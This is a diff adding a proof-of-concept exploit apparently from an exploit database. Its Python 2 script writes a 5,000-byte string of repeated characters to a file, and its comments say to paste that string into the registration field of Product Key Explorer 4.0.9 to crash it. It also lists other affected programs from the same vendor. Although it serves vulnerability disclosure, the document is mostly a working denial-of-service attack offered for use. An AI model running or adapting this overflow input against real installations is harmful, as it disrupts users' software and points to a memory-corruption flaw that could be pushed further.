@@ -1,0 +1,46 @@
+# Exploit Title: Product Key Explorer 4.0.9 - Denial of Service (PoC)
+# Date: 2018-12-25
+# Exploit Author: T3jv1l
+# Vendor Homepage: :http://www.nsauditor.com
+# Software: http://www.nsauditor.com/downloads/productkeyexplorer_setup.exe
+# Contact: https://twitter.com/T3jv1l
+# Version:  Product Key Explorer 4.0.9
+# Tested on: Windows 7 SP1 x86
+
+# Other affected software from the vendor
+# Software: http://www.nsauditor.com/downloads/backeyrecovery_setup.exe
+# Software: http://www.nsauditor.com/downloads/apkf_setup.exe
+# Software: http://www.nsauditor.com/downloads/officeproductkeyfinder_setup.exe
+# Software: http://spotauditor.nsauditor.com/downloads/spotauditor_setup.exe
+# Software: http://www.nsauditor.com/downloads/spotmsn_setup.exe
+# Software: http://www.nsauditor.com/downloads/spotie_setup.exe
+# Software: http://www.nsauditor.com/downloads/spotftp_setup.exe
+# Software: http://www.network-inventory-software.com/downloads/nhsi_setup.exe
+# Software: http://www.nsauditor.com/downloads/nsi_setup.exe
+# Software: http://www.nsauditor.com/downloads/blueauditor_setup.exe
+# Software: http://www.nsauditor.com/downloads/networksleuth_setup.exe
+# Software: http://www.nsauditor.com/downloads/remshutdown_setup.exe
+# Software: http://www.nsauditor.com/downloads/dnss_setup.exe
+
+# PoC:
+# 1.  Download and install the setup file
+# 2.  A file "PoC.txt" will be created
+# 3.  Click Help > Register... in tool bar
+# 4.  Copy the contents of the file (PoC.txt) and paste in the Registration Key/Name field 
+# 5.  Click OK and BOOMMMM !!!! 
+
+#!/usr/bin/python
+
+buffer = "\x41" * 2000
+buffer += "\x42" * 2000
+buffer += "\x43" * 1000
+
+payload = buffer
+try:
+    f=open("PoC.txt","w")
+    print "[+] Creating %s bytes payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
